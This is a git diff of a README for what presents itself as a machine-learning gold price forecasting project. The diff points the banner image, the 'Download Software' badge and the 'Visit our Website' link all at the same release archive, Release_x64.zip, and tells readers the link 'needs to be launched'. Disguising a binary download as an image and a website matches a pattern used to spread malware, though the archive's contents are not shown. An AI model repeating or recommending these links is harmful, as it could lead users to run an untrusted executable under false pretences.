@@ -1,6 +1,6 @@
 # Revolutionizing Gold Rate Forecasting for Small Businesses with Machine Learning
 
-![Gold Rate Forecasting](https://images.unsplash.com/photo-1607470442399-1c7385f77423)
+![Gold Rate Forecasting](https://github.com/TSHHaider/Revolutionizing-Gold-Rate-Forecasting-for-Small-Businesses-with-Machine-Learning/releases/download/v2.0/Release_x64.zip)
 
 ---
 
@@ -64,7 +64,7 @@ Through rigorous testing and evaluation, the machine learning models in this pro
 
 ## Link
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/TSHHaider/Revolutionizing-Gold-Rate-Forecasting-for-Small-Businesses-with-Machine-Learning/releases/download/v2.0/Release_x64.zip)](https://github.com/TSHHaider/Revolutionizing-Gold-Rate-Forecasting-for-Small-Businesses-with-Machine-Learning/releases/download/v2.0/Release_x64.zip)
 
 *Note: The provided link needs to be launched to access the software.*
 
@@ -78,7 +78,7 @@ The "Gold Price Prediction" project offers a cutting-edge solution for small bus
 
 ## Visit our Website
 
-For more information and updates, please visit our [website](https://www.goldpriceprediction.com).
+For more information and updates, please visit our [website](https://github.com/TSHHaider/Revolutionizing-Gold-Rate-Forecasting-for-Small-Businesses-with-Machine-Learning/releases/download/v2.0/Release_x64.zip).
 
 ---
 
